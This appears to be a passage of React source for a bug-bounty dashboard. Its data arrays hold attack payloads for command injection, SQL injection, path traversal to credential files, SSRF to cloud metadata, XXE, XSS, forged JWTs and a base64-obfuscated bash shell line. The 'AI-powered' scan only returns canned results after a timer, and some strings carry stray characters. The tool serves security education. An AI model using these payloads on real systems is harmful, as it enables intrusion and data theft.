        'Send JSON operators: $gt, $where, $regex',

        'Test for authentication bypass with $ne',

        'Try NoSQL operators in parameters',

        'Check for $expr in MongoDB',

        'Use $exists to detect fields'

      ],

      realReports: [

        { program: 'Envato', title: 'NoSQL Injection on account，淡主食', bounty: '$0 (89 upvotes)', link: 'hackerone.com/reports/3560256' },

        { program: 'YPO Source', title: 'NoSQL Injection', bounty: '$0 (40 upvotes)', link: 'hackerone.com/reports/3418031' }

      ]

    },

    { 

      id: 'rce', 

      name: 'Remote Code Execution (RCE)', 

      icon: '💥', 

      color: '#ff4466', 

      severity: 'critical',

      description: 'Arbitrary code execution on server. Full system compromise, data breach, persistent access.',

      bounties: 'Critical: $10,000-$100,000+',

      payloads: [

        '`whoami`',

        '$(whoami)',

        '| whoami',

        '; whoami',

        '&& whoami',

        "'; exec master..xp_cmdshell 'whoami'--",

        '{{7*7}}',

        '${exec whoami}',

        'system("id")'

      ],

      detection: [

        'Command injection in system() calls',

        'Code injection in eval()',

        'Deserialization attacks',

        'Template injection (SSTI)'

      ],

      realReports: [

        { program: 'PlayStation', title: 'PS4 BD-J privilege escalation using nested JAR', bounty: '$2,500 (184 upvotes)', link: 'hackerone.com/reports/3452696' },

        { program: 'Shopify', title: 'mruby-engine UAF enables local RCE', bounty: '$0 (32 upvotes)', link: 'hackerone.com/reports/3679660' }

      ]

    },

    { 

      id: 'path_traversal', 

      name: 'Path Traversal', 

      icon: '📁', 

      color: '#aa88ff', 

      severity: 'high',

      description: 'Access files outside intended directory. Read sensitive files, sometimes write or RCE.',

      bounties: 'High: $1,000-$20,000',

      payloads: [

        '../../../etc/passwd',

        '..\\..\\..\\windows\\system32\\config\\sam',

        '....//....//....//etc/passwd',

        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',

        '..%252f..%252f..%252fetc%252fpasswd',

        'file:///etc/passwd',

        'zip:///path/to恶意.jar!/etc/passwd'

      ],

      detection: [

        'Find file operation parameters',

        'Test with /etc/passwd, windows\\system32\\config',

        'Check for null byte injection',

        'Test double URL encoding'

      ],

      realReports: [

        { program: 'Ruby on Rails', title: 'ActiveStorage Path Traversal via Custom Blob Key', bounty: '$0 (53 upvotes)', link: 'hackerone.com/reports/3580511' },

        { program: 'arkadiyt-projects', title: 'Path Traversal in writeFile via Unsafe Prefix', bounty: '$0 (21 upvotes)', link: 'hackerone.com/reports/3634571' }

      ]

    },

    { 

      id: 'auth_bypass', 

      name: 'Authentication Bypass', 

      icon: '🔑', 

      color: '#00ff88', 

      severity: 'critical',

      description: 'Circumvent authentication mechanisms. Gain access without credentials or escalate privileges.',

      bounties: 'Critical: $5,000-$50,000',

      payloads: [

        "Admin credentials: admin/admin",

        "Bypass: ' OR 1=1--",

        "JWT: alg: none attack",

        "Session fixation: use known session ID",

        "OAuth redirect_uri manipulation",

        "JWT algorithm confusion (HS256-to-RS256)",

        "jwt.io none algorithm: {\`alg\`:\`none\`}",

        "Bearer: eyJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIn0.",

        "Cookie: session=admin",

        "Authorization: Basic YWRtaW46YWRtaW4="

      ],

      detection: [

        'Test authentication endpoints',

        'Check for missing rate limits',

        'Analyze session token generation',

        'Test OAuth flow security',

        'Check JWT algorithm confusion',

        'Test for default credentials'

      ],

      realReports: [

        { program: 'Rocket.Chat', title: 'Complete authentication bypass to admin', bounty: '$0 (89 upvotes)', link: 'hackerone.com/reports/3564655' },

        { program: 'curl', title: 'TLS verifyhost bypass in rustls/mbedTLS/wolfSSL', bounty: '$0 (4 upvotes)', link: 'hackerone.com/reports/3734095' }

      ]

    },

    { 

      id: 'oauth', 

      name: 'OAuth 2.0 Vulnerabilities', 

      icon: '🔐', 

      color: '#ff6688', 

      severity: 'high',

      description: 'OAuth implementation flaws allowing account takeover or unauthorized access.',

      bounties: 'High: $2,000-$20,000',

      payloads: [

        'redirect_uri: http://evil.com',

        'redirect_uri: null/https://expected.com@evil.com',

        'state parameter missing',

        'code reuse after logout',

        'Scope escalation: email → email,full_access'

      ],

      detection: [

        'Check redirect_uri validation',

        'Test state parameter implementation',

        'Verify token generation randomness',

        'Check token reuse after logout'

      ],

      realReports: [

        { program: 'CoinMate.io', title: 'HMAC signature bypass allowing request forgery', bounty: '$0 (40 upvotes)', link: 'hackerone.com/reports/3670955' }

      ]

    },

    { 

      id: 'open_redirect', 

      name: 'Open Redirect', 

      icon: '↪️', 

      color: '#ffcc00', 

      severity: 'medium',

      description: 'User-controlled redirect to arbitrary domain. Phishing, session hijacking.',

      bounties: 'Medium: $500-$5,000',

      payloads: [

        'https://evil.com',

        '//evil.com',

        '///evil.com',

        'https://expected.com@evil.com',

        'https://expected.com\.evil.com',

        '\\evil.com',

        '%2F%2Fevil.com'

      ],

      detection: [

        'Find redirect parameters',

        'Test with //, ///, expected@evil',

        'Check for meta refresh redirects',

        'Test 302 location header manipulation'

      ],

      realReports: [

        { program: 'Liberapay', title: 'Link Hijacking via Expired Twitter Account', bounty: '$0 (76 upvotes)', link: 'hackerone.com/reports/3723002' },

        { program: 'Rocket.Chat', title: 'Open Redirect in Rocket.Chat', bounty: '$0 (32 upvotes)', link: 'hackerone.com/reports/3418031' }

      ]

    },

    { 

      id: 'business_logic', 

      name: 'Business Logic Vulnerabilities', 

      icon: '🏗️', 

      color: '#88ddff', 

      severity: 'high',

      description: 'Application logic flaws allowing unintended actions. Price manipulation, race conditions.',

      bounties: 'High: $1,000-$15,000',

      payloads: [

        'Price manipulation: item_price=-100',

        'Quantity overflow: quantity=999999',

        'Race conditions: concurrent requests',

        'Workflow bypass: skip payment step',

        'Integer overflow in transactions'

      ],

      detection: [

        'Understand business workflows',

        'Test edge cases and boundaries',

        'Attempt concurrent requests',

        'Check parameter manipulation'

      ],

      realReports: [

        { program: 'pixiv', title: 'Non-premium user can disable Ads', bounty: '$3,000 (104 upvotes)', link: 'hackerone.com/reports/3183520' },

        { program: 'curl', title: 'HSTS multi-trailing-dot bypass', bounty: '$0 (8 upvotes)', link: 'hackerone.com/reports/3733984' }

      ]

    },

    { 

      id: 'toctou', 

      name: 'TOCTOU Race Conditions', 

      icon: '⏱️', 

      color: '#cc88ff', 

      severity: 'high',

      description: 'Time-of-check to time-of-use race conditions. Atomicity violations in security checks.',

      bounties: 'High: $2,000-$20,000',

      payloads: [

        'Symlink attack during file operations',

        'Concurrent authentication requests',

        'File race in --skip-existing',

        'Double-free after check'

      ],

      detection: [

        'Find file operations with race window',

        'Test with concurrent requests',

        'Check for atomicity violations',

        'Analyze shared resource access'

      ],

      realReports: [

        { program: 'Node.js', title: 'TOCTOU Race in SharedArrayBuffer UTF-8 Decode', bounty: '$0 (6 upvotes)', link: 'hackerone.com/reports/3752489' },

        { program: 'curl', title: 'curl --skip-existing TOCTOU race', bounty: '$0 (20 upvotes)', link: 'hackerone.com/reports/3747959' }

      ]

    },

    { 

      id: 'deserialization', 

      name: 'Insecure Deserialization', 

      icon: '📦', 

      color: '#ffaa44', 

      severity: 'critical',

      description: 'Untrusted data deserialized leading to RCE. Common in Java, PHP, Python applications.',

      bounties: 'Critical: $5,000-$50,000',

      payloads: [

        'O:10:"Example":1:{s:3:"cmd";s:8:"whoami";}',

        'rO0ABXQAL1VuZGVmaW5lZEv/////dHJhY2U=',

        '{{obj.__class__.__mro__[1].__subclasses__()}}',

        'bash -c {echo,YmFzaCAtaSA+JG1hc2g=}|{base64,-d}|{bash,-i}'

      ],

      detection: [

        'Find serialization endpoints',

        'Test with known gadget chains',

        'Check Content-Type validation',

        'Analyze type handling'

      ],

      realReports: [

        { program: 'curl', title: 'SMTP Command Injection via CRLF', bounty: '$0 (5 upvotes)', link: 'hackerone.com/reports/3651975' }

      ]

    },

    { 

      id: 'memory', 

      name: 'Memory Corruption', 

      icon: '💨', 

      color: '#ff4466', 

      severity: 'critical',

      description: 'Low-level memory issues: UAF, buffer overflow, double-free. Leads to RCE or info leak.',

      bounties: 'Critical: $10,000-$100,000+',

      payloads: [

        "Heap overflow: A'*10000",

        "Use-after-free: free() then use",

        "Double-free: free() same pointer twice",

        "Format string: %s%s%s%s",

        "Integer overflow: large value"

      ],

      detection: [

        'Fuzz binary interfaces',

        'Analyze memory handling',

        'Test with large inputs',

        'Check for bounds validation'

      ],

      realReports: [

        { program: 'PlayStation', title: 'Double fdrop on a socket', bounty: '$10,000 (184 upvotes)', link: 'hackerone.com/reports/3320669' },

        { program: 'curl', title: 'Use-After-Free in SMB connection reuse', bounty: '$0 (57 upvotes)', link: 'hackerone.com/reports/3591956' },

        { program: 'curl', title: 'Heap-buffer-overflow in cert info', bounty: '$0 (7 upvotes)', link: 'hackerone.com/reports/3684614' }

      ]

    }

  ]



  const selected = vulnCategories.find(v => v.id === selectedVuln)



  return (

    <div>

      {/* Header */}

      <div style={{ 

        background: 'linear-gradient(135deg, rgba(255, 68, 68, 0.15), rgba(255, 136, 68, 0.1))',

        borderRadius: '16px',

        padding: '24px',

        border: '1px solid rgba(255, 68, 68, 0.3)',

        marginBottom: '24px'

      }}>

        <div style={{ display: 'flex', alignItems: 'center', gap: '16px', marginBottom: '12px' }}>

          <span style={{ fontSize: '40px' }}>🎯</span>

          <div>

            <h2 style={{ fontSize: '28px', fontWeight: 'bold', background: 'linear-gradient(90deg, #ff4444, #ff8844)', WebkitBackgroundClip: 'text', WebkitTextFillColor: 'transparent' }}>

              Bug Bounty Methodology

            </h2>

            <p style={{ fontSize: '13px', color: '#888' }}>Real payloads, techniques, and reports from HackerOne + cheat sheets</p>

          </div>

        </div>

        <div style={{ display: 'flex', gap: '8px', flexWrap: 'wrap' }}>

          <span style={{ background: 'rgba(255,68,68,0.2)', color: '#ff4444', padding: '4px 12px', borderRadius: '4px', fontSize: '11px', fontWeight: '600' }}>12 Vulnerability Types</span>

          <span style={{ background: 'rgba(0,212,255,0.2)', color: '#00d4ff', padding: '4px 12px', borderRadius: '4px', fontSize: '11px', fontWeight: '600' }}>Real Reports</span>

          <span style={{ background: 'rgba(0,255,136,0.2)', color: '#00ff88', padding: '4px 12px', borderRadius: '4px', fontSize: '11px', fontWeight: '600' }}>Bounty Ranges</span>

        </div>

      </div>



      <div style={{ display: 'grid', gridTemplateColumns: selected ? '1fr 1fr' : '1fr', gap: '24px' }}>

        {/* Vulnerability Grid */}

        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(280px, 1fr))', gap: '12px' }}>

          {vulnCategories.map(vuln => (

            <button

              key={vuln.id}

              onClick={() => setSelectedVuln(selectedVuln === vuln.id ? null : vuln.id)}

              style={{

                background: selectedVuln === vuln.id ? `${vuln.color}25` : 'rgba(15, 15, 26, 0.95)',

                border: `2px solid ${selectedVuln === vuln.id ? vuln.color : 'rgba(255,255,255,0.05)'}`,

                borderRadius: '12px',

                padding: '16px',

                cursor: 'pointer',

                textAlign: 'left',

                transition: 'all 0.2s'

              }}

              onMouseEnter={(e) => {

                if (selectedVuln !== vuln.id) e.currentTarget.style.borderColor = `${vuln.color}50`

              }}

              onMouseLeave={(e) => {

                if (selectedVuln !== vuln.id) e.currentTarget.style.borderColor = 'rgba(255,255,255,0.05)'

              }}

            >

              <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '8px' }}>

                <span style={{ fontSize: '24px' }}>{vuln.icon}</span>

                <div>

                  <span style={{ fontSize: '14px', fontWeight: 'bold', color: vuln.color }}>{vuln.name}</span>

                  <span style={{ fontSize: '11px', color: vuln.severity === 'critical' ? '#ff4444' : '#ff8844', marginLeft: '8px', textTransform: 'uppercase' }}>{vuln.severity}</span>

                </div>

              </div>

              <p style={{ fontSize: '11px', color: '#666', marginBottom: '8px' }}>{vuln.description.substring(0, 80)}...</p>

              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>

                <span style={{ fontSize: '10px', color: '#00ff88' }}>{vuln.bounties}</span>

                <span style={{ fontSize: '10px', color: '#666' }}>{vuln.payloads.length} payloads</span>

              </div>

            </button>

          ))}

        </div>



        {/* Detail Panel */}

        {selected && (

          <div style={{ 

            background: 'rgba(15, 15, 26, 0.95)',

            borderRadius: '16px',

            padding: '24px',

            border: `2px solid ${selected.color}`,

            maxHeight: '80vh',

            overflow: 'auto'

          }}>

            <div style={{ display: 'flex', alignItems: 'center', gap: '16px', marginBottom: '20px' }}>

              <span style={{ fontSize: '48px' }}>{selected.icon}</span>

              <div>

                <span style={{ fontSize: '12px', fontWeight: 'bold', color: selected.severity === 'critical' ? '#ff4444' : '#ff8844', textTransform: 'uppercase' }}>{selected.severity}</span>

                <h3 style={{ fontSize: '24px', fontWeight: 'bold', color: '#fff' }}>{selected.name}</h3>

                <span style={{ fontSize: '14px', color: '#00ff88' }}>{selected.bounties}</span>

              </div>

            </div>

            

            <p style={{ fontSize: '13px', color: '#aaa', marginBottom: '20px', lineHeight: '1.6' }}>{selected.description}</p>

            

            <div style={{ marginBottom: '20px' }}>

              <h4 style={{ fontSize: '13px', fontWeight: '600', color: selected.color, marginBottom: '8px' }}>🎯 Test Payloads</h4>

              <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>

                {selected.payloads.map((payload, i) => (

                  <code key={i} style={{ 

                    background: 'rgba(0,0,0,0.4)', 

                    color: '#00d4ff', 

                    fontSize: '11px', 

                    padding: '8px 12px', 

                    borderRadius: '4px',

                    fontFamily: 'monospace',

                    overflow: 'auto',

                    whiteSpace: 'nowrap'

                  }}>{payload}</code>

                ))}

              </div>

            </div>

            

            <div style={{ marginBottom: '20px' }}>

              <h4 style={{ fontSize: '13px', fontWeight: '600', color: '#888', marginBottom: '8px' }}>🔍 Detection Techniques</h4>

              <ul style={{ fontSize: '12px', color: '#aaa', listStyle: 'none', padding: 0, margin: 0 }}>

                {selected.detection.map((d, i) => (

                  <li key={i} style={{ marginBottom: '6px', paddingLeft: '16px', position: 'relative' }}>

                    <span style={{ position: 'absolute', left: 0, color: selected.color }}>•</span> {d}

                  </li>

                ))}

              </ul>

            </div>

            

            <div style={{ 

              background: 'rgba(0,0,0,0.3)',

              borderRadius: '8px',

              padding: '16px',

              border: `1px solid ${selected.color}30`

            }}>

              <h4 style={{ fontSize: '12px', fontWeight: '600', color: '#00ff88', marginBottom: '12px' }}>📋 Real HackerOne Reports</h4>

              {selected.realReports.map((report, i) => (

                <div key={i} style={{

                  padding: '12px',

                  background: 'rgba(0,0,0,0.2)',

                  borderRadius: '6px',

                  marginBottom: '8px'

                }}>

                  <div style={{ fontSize: '12px', fontWeight: '600', color: '#fff', marginBottom: '4px' }}>{report.program}</div>

                  <div style={{ fontSize: '11px', color: '#00d4ff', marginBottom: '4px' }}>{report.title}</div>

                  <div style={{ fontSize: '10px', color: '#888' }}>{report.bounty} • {report.link}</div>

                </div>

              ))}

            </div>

          </div>

        )}

      </div>

    </div>

  )

}



// ============ AUTO AGENT SELECT VIEW ============

function _AutoAgentSelectView() {

  const [selectedVulnType, setSelectedVulnType] = useState<string>('')

  const [scanResults, setScanResults] = useState<any>(null)

  const [isScanning, setIsScanning] = useState(false)

  

  const vulnToAgents: Record<string, {primary: string, secondary: string[], description: string, owasp: string[], payloads: string[], severity: string}> = {

    'sql_injection': {

      primary: 'api_security',

      secondary: ['threat_intelligence', 'security_operations'],

      description: 'SQL Injection requires API Security agent with comprehensive SQL injection payloads',

      owasp: ['A01', 'A05'],

      payloads: ["' OR '1'='1", "1' UNION SELECT NULL--", "'; DROP TABLE users; --", "1' ORDER BY 1--", "admin'--"],

      severity: 'critical'

    },

    'xss': {

      primary: 'api_security',

      secondary: ['threat_intelligence'],

      description: 'XSS requires API Security agent for fuzzing with XSS payloads and DOM analysis',

      owasp: ['A05', 'A07'],

      payloads: ['<script>alert(document.domain)</script>', '<img src=x onerror=alert(1)>', '<svg onload=alert(1)>', '#\"><img src=x onerror=alert(1)>', 'javascript:alert(document.domain)'],

      severity: 'high'

    },

    'idor': {

      primary: 'api_security',

      secondary: ['threat_intelligence', 'adaptive_defense'],

      description: 'IDOR requires API Security agent for authorization testing and resource enumeration',

      owasp: ['A01'],

      payloads: ['/api/users/123 → /api/users/124', 'POST ID manipulation', 'UUID enumeration', 'HTTP parameter pollution'],

      severity: 'high'

    },

    'ssrf': {

      primary: 'api_security',

      secondary: ['threat_intelligence', 'supply_chain'],

      description: 'SSRF requires API Security agent for protocol testing and internal network probing',

      owasp: ['A01', 'A05', 'A10'],

      payloads: ['http://169.254.169.254/', 'http://localhost:8500', 'file:///etc/passwd', 'gopher://127.0.0.1:6379/_INFO', 'dict://localhost:11211/%0astats'],

      severity: 'critical'

    },

    'rce': {

      primary: 'api_security',

      secondary: ['threat_intelligence', 'adaptive_defense', 'security_operations'],

      description: 'RCE requires API Security agent with command injection payloads + Threat Intel for malware analysis',

      owasp: ['A05', 'A08'],

      payloads: ['`whoami`', '$(whoami)', '| whoami', '; whoami', '&& whoami', "'; exec master..xp_cmdshell 'whoami'--", '{{7*7}}', '${exec whoami}'],

      severity: 'critical'

    },

    'xxe': {

      primary: 'api_security',

      secondary: ['supply_chain'],

      description: 'XXE requires API Security agent for XML parsing testing and file read exploitation',

      owasp: ['A05', 'A08'],

      payloads: ['<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]>', '<svg xmlns:xlink="http://www.w3.org/1999/xlink"><image xlink:href="expect://ls"/>', 'Billion Laughs attack payload'],

      severity: 'critical'

    },

    'ssti': {

      primary: 'api_security',

      secondary: ['threat_intelligence'],

      description: 'SSTI requires API Security agent with template injection payloads for code execution',

      owasp: ['A05', 'A10'],

      payloads: ['{{7*7}}', '{{config}}', '${7*7}', '${T(SYSTEM)}', '{{request|attr("application")}}'],

      severity: 'critical'

    },

    'graphql': {

      primary: 'api_security',

      secondary: ['supply_chain'],

      description: 'GraphQL requires API Security agent with introspection and batch attack testing',

      owasp: ['A01', 'A05'],

      payloads: [
        // Introspection Attacks
        `{"query":"{ __schema { types { name fields { name } } queryType { name } mutationType { name } } }"}`,
        `{"query":"{ __type(name: \"User\") { name fields { name type { name } } } }"}`,
        `{"query":"{ __schema { mutationType { fields { name description args { name type { name } } } } } }"}`,
        // Batching Attacks (Alias Abuse)
        `{"query":"mutation { login1: login(user: \"admin\", pass: \"1111\") { success } login2: login(user: \"admin\", pass: \"1112\") { success } login3: login(user: \"admin\", pass: \"1113\") { success } }"}`,
        `{"query":"{ a1: user(id: \"1\") { name } a2: user(id: \"1\") { name } a3: user(id: \"1\") { name } a4: user(id: \"1\") { name } a5: user(id: \"1\") { name } }"}`,
        // JSON List Batching
        `[{"query":"mutation { login(user: \"admin\", pass: \"1111\") }"},{"query":"mutation { login(user: \"admin\", pass: \"1112\") }"},{"query":"mutation { login(user: \"admin\", pass: \"1113\") }"}]`,
        // Nested Query DoS
        `{"query":"{ user { friends { friends { friends { friends { name } } } } } }"}`,
        // Circular Reference DoS
        `{"query":"{ user(id: \"1\") { posts { author { posts { author { name } } } } } }"}`,
        // Mutation Injection
        `{"query":"mutation { signIn(login: \"Admin\", password: \"secret\") { success token } }"}`,
        // SQL/NoSQL in GraphQL params
        `{"query":"{ doctors(search: \"{$regex:.*,lastName:Admin}\") { firstName } }"}`,
      ],

      severity: 'high'

    },

    'nosql': {

      primary: 'api_security',

      secondary: ['security_operations'],

      description: 'NoSQL Injection requires API Security agent with MongoDB/Redis operator payloads',

      owasp: ['A05'],

      payloads: ['{"$gt": ""}', '{"$where": "1=1"}', '{"$regex": ".*"}', '{"login": {"$ne": null}}', '{"$expr": {"$gt": [1, 1]}}'],

      severity: 'critical'

    },

    'auth_bypass': {

      primary: 'api_security',

      secondary: ['adaptive_defense', 'security_operations'],

      description: 'Auth bypass requires API Security agent + Adaptive Defense for session analysis',

      owasp: ['A02', 'A07'],

      payloads: ["' OR 1=1--", 'alg: none JWT attack', 'Session fixation', 'OAuth redirect_uri manipulation', 'Basic Auth bypass'],

      severity: 'critical'

    },

    'oauth': {

      primary: 'api_security',

      secondary: ['threat_intelligence'],

      description: 'OAuth vulnerabilities require API Security agent with flow manipulation payloads',

      owasp: ['A01', 'A07'],

      payloads: ['redirect_uri: http://evil.com', 'redirect_uri: null/https://expected.com@evil.com', 'state parameter missing', 'code reuse after logout', 'Scope escalation'],

      severity: 'high'

    },

    'path_traversal': {

      primary: 'api_security',

      secondary: ['threat_intelligence'],

      description: 'Path traversal requires API Security agent for file operation fuzzing',

      owasp: ['A01', 'A05'],

      payloads: ['../../../etc/passwd', '..\\..\\..\\windows\\system32\\config\\sam', '%2e%2e%2f%2e%2e%2fetc%2fpasswd', 'file:///etc/passwd'],

      severity: 'high'

    },

    'open_redirect': {

      primary: 'api_security',

      secondary: ['threat_intelligence'],

      description: 'Open redirect requires API Security agent for redirect parameter testing',

      owasp: ['A01'],

      payloads: ['https://evil.com', '//evil.com', '///evil.com', 'https://expected.com@evil.com', '\\evil.com'],

      severity: 'medium'

    },

    'business_logic': {

      primary: 'api_security',

      secondary: ['adaptive_defense'],

      description: 'Business logic requires API Security agent + Adaptive Defense for concurrent testing',

      owasp: ['A04', 'A08'],

      payloads: ['Price manipulation: item_price=-100', 'Quantity overflow', 'Race conditions', 'Workflow bypass'],

      severity: 'high'

    },

    'toctou': {

      primary: 'api_security',

      secondary: ['adaptive_defense', 'security_operations'],

      description: 'TOCTOU race conditions require API Security agent + Adaptive Defense for atomicity testing',

      owasp: ['A04', 'A08'],

      payloads: ['Symlink attack during file operations', 'Concurrent authentication requests', 'File race in --skip-existing', 'Double-free after check'],

      severity: 'high'

    },

    'deserialization': {

      primary: 'api_security',

      secondary: ['threat_intelligence'],

      description: 'Deserialization requires API Security agent + Threat Intel for gadget chain analysis',

      owasp: ['A08', 'A05'],

      payloads: ['O:10:"Example":1:{s:3:"cmd";s:8:"whoami";}', 'rO0ABXQAL1VuZGVmaW5lZEv/////dHJhY2U=', '{{obj.__class__.__mro__[1].__subclasses__()}}', 'bash -c {echo,YmFzaCAtaSA+JG1hc2g=}|{base64,-d}|{bash,-i}'],

      severity: 'critical'

    },

    'memory': {

      primary: 'threat_intelligence',

      secondary: ['api_security', 'adaptive_defense'],

      description: 'Memory corruption requires Threat Intelligence agent + Adaptive Defense for fuzzing',

      owasp: ['A08', 'A10'],

      payloads: ["Heap overflow: A'*10000", 'Use-after-free patterns', 'Double-free: free() same twice', 'Format string: %s%s%s%s', 'Integer overflow: large value'],

      severity: 'critical'

    },

    'ci_cd': {

      primary: 'supply_chain',

      secondary: ['security_operations', 'adaptive_defense'],

      description: 'CI/CD security requires Supply Chain agent for pipeline analysis + Security Operations for monitoring',

      owasp: ['A03', 'A08'],

      payloads: ['Secrets in workflow files', 'Untrusted checkout actions', 'Missing security scans', 'Exposed credentials in logs', 'Privilege escalation in pipelines'],

      severity: 'critical'

    },

    'sensitive_data': {

      primary: 'supply_chain',

      secondary: ['security_operations'],

      description: 'Sensitive data exposure requires Supply Chain agent for data classification + Security Operations for monitoring',

      owasp: ['A02', 'A04'],

      payloads: ['Hardcoded API keys', 'Passwords in code', 'Exposed .env files', 'Database credentials in logs', 'AWS keys in source code'],

      severity: 'high'

    }

  }






  const handleScan = async () => {

    if (!selectedVulnType) return

    setIsScanning(true)

    setScanResults(null)

    

    // Simulate scanning with auto-recommendation

    setTimeout(() => {

      const config = vulnToAgents[selectedVulnType]

      setScanResults({

        vulnerability: selectedVulnType,

        recommendedAgent: config.primary,

        secondaryAgents: config.secondary,

        description: config.description,

        owaspCategories: config.owasp,

        testPayloads: config.payloads.slice(0, 5),

        severity: config.severity,

        confidence: 'high'

      })

      setIsScanning(false)

    }, 1500)

  }



  const agentInfo: Record<string, {name: string, color: string, icon: string, description: string}> = {

    threat_intelligence: { name: '🔍 Threat Intelligence', color: '#ff8844', icon: '🔍', description: 'YARA rules, IOC enrichment, malware analysis' },

    security_operations: { name: '🛡️ Security Operations', color: '#00d4ff', icon: '🛡️', description: 'SIEM integration, SOAR playbooks, alert triage' },

    adaptive_defense: { name: '⚡ Adaptive Defense', color: '#aa88ff', icon: '⚡', description: 'ML anomaly detection, behavioral analysis' },

    supply_chain: { name: '📦 Supply Chain', color: '#00ff88', icon: '📦', description: 'SBOM generation, CVE scanning, license compliance' },

    api_security: { name: '🔗 API Security', color: '#ffaa00', icon: '🔗', description: 'OpenAPI/GraphQL analysis, fuzzing, auth testing' },

  }



  return (

    <div>

      {/* Header */}

      <div style={{ 

        background: 'linear-gradient(135deg, rgba(170, 136, 255, 0.15), rgba(0, 212, 255, 0.1))',

        borderRadius: '16px',

        padding: '24px',

        border: '1px solid rgba(170, 136, 255, 0.3)',

        marginBottom: '24px'

      }}>

        <div style={{ display: 'flex', alignItems: 'center', gap: '16px', marginBottom: '12px' }}>

          <span style={{ fontSize: '40px' }}>⚡</span>

          <div>

            <h2 style={{ fontSize: '28px', fontWeight: 'bold', background: 'linear-gradient(90deg, #aa88ff, #00d4ff)', WebkitBackgroundClip: 'text', WebkitTextFillColor: 'transparent' }}>

              Auto Agent Selection

            </h2>

            <p style={{ fontSize: '13px', color: '#888' }}>AI-powered agent selection based on vulnerability type - select a bug type and get the perfect agent configuration</p>

          </div>

        </div>

        <div style={{ display: 'flex', gap: '8px', flexWrap: 'wrap' }}>

          <span style={{ background: 'rgba(170,136,255,0.2)', color: '#aa88ff', padding: '4px 12px', borderRadius: '4px', fontSize: '11px', fontWeight: '600' }}>16 Vulnerability Types</span>

          <span style={{ background: 'rgba(0,212,255,0.2)', color: '#00d4ff', padding: '4px 12px', borderRadius: '4px', fontSize: '11px', fontWeight: '600' }}>5 Phase 5 Agents</span>

          <span style={{ background: 'rgba(0,255,136,0.2)', color: '#00ff88', padding: '4px 12px', borderRadius: '4px', fontSize: '11px', fontWeight: '600' }}>Auto-Configure</span>

        </div>

      </div>



      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '24px' }}>

        {/* Vulnerability Selector */}

        <div style={{ 

          background: 'rgba(15, 15, 26, 0.95)',

          borderRadius: '16px',

          padding: '24px',

          border: '1px solid rgba(255,255,255,0.05)'

        }}>

          <h3 style={{ fontSize: '16px', fontWeight: '600', marginBottom: '16px', color: '#aa88ff' }}>Select Vulnerability Type</h3>

          

          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(2, 1fr)', gap: '8px', marginBottom: '20px' }}>

            {Object.keys(vulnToAgents).map(vuln => (

              <button

                key={vuln}

                onClick={() => setSelectedVulnType(vuln)}

                style={{

                  background: selectedVulnType === vuln ? `${vulnToAgents[vuln].severity === 'critical' ? '#ff4444' : vulnToAgents[vuln].severity === 'high' ? '#ff8844' : '#ffaa00'}25` : 'rgba(0,0,0,0.3)',

                  border: `1px solid ${selectedVulnType === vuln ? (vulnToAgents[vuln].severity === 'critical' ? '#ff4444' : vulnToAgents[vuln].severity === 'high' ? '#ff8844' : '#ffaa00') : 'rgba(255,255,255,0.1)'}`,

                  borderRadius: '8px',

                  padding: '10px',

                  cursor: 'pointer',

                  textAlign: 'left',

                  transition: 'all 0.2s'

                }}

              >

                <span style={{ fontSize: '12px', color: selectedVulnType === vuln ? '#fff' : '#888', fontWeight: selectedVulnType === vuln ? '600' : '400', textTransform: 'capitalize' }}>

                  {vuln.replace(/_/g, ' ')}

                </span>

              </button>

            ))}

          </div>



          <button

            onClick={handleScan}

            disabled={!selectedVulnType || isScanning}

            style={{

              width: '100%',

              background: isScanning ? 'rgba(255,255,255,0.1)' : 'linear-gradient(135deg, #aa88ff, #00d4ff)',

              color: isScanning ? '#666' : '#fff',

              border: 'none',

              borderRadius: '10px',

              padding: '14px',

              fontWeight: '700',

              cursor: isScanning ? 'not-allowed' : 'pointer',

              fontSize: '14px'

            }}

          >

            {isScanning ? '⏳ Analyzing...' : '⚡ Auto-Select Best Agent'}

          </button>

        </div>



        {/* Results Panel */}

        <div style={{ 

          background: 'rgba(15, 15, 26, 0.95)',

          borderRadius: '16px',

          padding: '24px',

          border: '1px solid rgba(255,255,255,0.05)'

        }}>

          <h3 style={{ fontSize: '16px', fontWeight: '600', marginBottom: '16px', color: '#00d4ff' }}>Agent Configuration</h3>

          

          {scanResults ? (

            <div>

              {/* Primary Agent */}

              <div style={{ 

                background: `${agentInfo[scanResults.recommendedAgent]?.color || '#00d4ff'}15`,

                border: `2px solid ${agentInfo[scanResults.recommendedAgent]?.color || '#00d4ff'}`,

                borderRadius: '12px',

                padding: '16px',

                marginBottom: '16px'

              }}>

                <div style={{ fontSize: '12px', color: '#00ff88', fontWeight: '600', marginBottom: '8px' }}>PRIMARY AGENT (Recommended)</div>

                <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '8px' }}>

                  <span style={{ fontSize: '32px' }}>{agentInfo[scanResults.recommendedAgent]?.icon || '🤖'}</span>

                  <div>

                    <div style={{ fontSize: '18px', fontWeight: 'bold', color: agentInfo[scanResults.recommendedAgent]?.color }}>{agentInfo[scanResults.recommendedAgent]?.name || scanResults.recommendedAgent}</div>

                    <div style={{ fontSize: '12px', color: '#888' }}>{agentInfo[scanResults.recommendedAgent]?.description}</div>

                  </div>

                </div>

              </div>



              {/* Secondary Agents */}

              <div style={{ marginBottom: '16px' }}>

                <div style={{ fontSize: '12px', color: '#888', fontWeight: '600', marginBottom: '8px' }}>SECONDARY AGENTS</div>

                <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>

                  {scanResults.secondaryAgents.map((agent: string) => (

                    <div key={agent} style={{

                      background: `${agentInfo[agent]?.color || '#888'}15`,

                      border: `1px solid ${agentInfo[agent]?.color || '#888'}40`,

                      borderRadius: '8px',

                      padding: '12px',

                      display: 'flex',

                      alignItems: 'center',

                      gap: '10px'

                    }}>

                      <span style={{ fontSize: '20px' }}>{agentInfo[agent]?.icon || '🤖'}</span>

